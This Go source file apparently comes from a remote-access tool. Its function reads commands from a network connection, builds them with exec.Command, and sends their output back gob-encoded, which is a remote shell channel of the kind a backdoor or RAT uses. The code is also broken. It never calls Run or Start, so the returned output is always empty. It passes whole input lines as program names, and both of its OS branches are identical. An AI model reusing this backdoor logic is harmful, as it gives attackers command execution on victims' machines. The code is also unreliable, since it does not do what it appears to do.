package ExecuteSystemCommandWindows

import (
	"bufio"
	"bytes"
	"encoding/gob"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
)

type Command struct {
	CmdOutput string
	CmdErr    string
}

func ExecCommandWindows(connection net.Conn) (err error) {
	reader := bufio.NewReader(connection)

	commandloop := true

	for commandloop {
		raw_user_input, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			continue
		}
		user_input := strings.TrimSuffix(raw_user_input, "\n")
		if user_input == "stop" {
			commandloop = false
		} else {
			fmt.Println("[+] User Command: ", user_input)

			var cmd_instance *exec.Cmd

			if runtime.GOOS == "windows" {
				cmd_instance = exec.Command(user_input)
			} else {
				cmd_instance = exec.Command(user_input)
			}

			var output bytes.Buffer
			var commandErr bytes.Buffer

			cmd_instance.Stdout = &output
			cmd_instance.Stderr = &commandErr

			cmdStruct := &Command{}

			cmdStruct.CmdOutput = output.String()
			cmdStruct.CmdErr = commandErr.String()

			encoder := gob.NewEncoder(connection)

			err := encoder.Encode(cmdStruct)

			if err != nil {
				fmt.Println(err)
				continue
			}
		}

	}

	return
}
